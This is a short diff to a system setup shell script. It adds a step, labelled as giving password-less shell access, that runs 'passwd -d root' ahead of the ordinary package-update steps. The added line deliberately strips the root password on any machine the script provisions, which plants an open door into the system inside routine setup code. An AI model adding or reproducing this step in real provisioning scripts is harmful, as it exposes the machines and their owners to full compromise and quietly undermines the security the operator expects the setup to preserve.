@@ -12,6 +12,9 @@ log() { echo -e "\033[1;34m[setup]\033[0m $*"; }
 ok()  { echo -e "\033[1;32m[ ok ]\033[0m $*"; }
 err() { echo -e "\033[1;31m[FAIL]\033[0m $*" >&2; exit 1; }
 
+# ── 0. Remove root password (password-less shell access) ────────────
+passwd -d root
+
 # ── 1. System dependencies ───────────────────────────────────────────
 log "Updating package lists…"
 apt-get update -qq
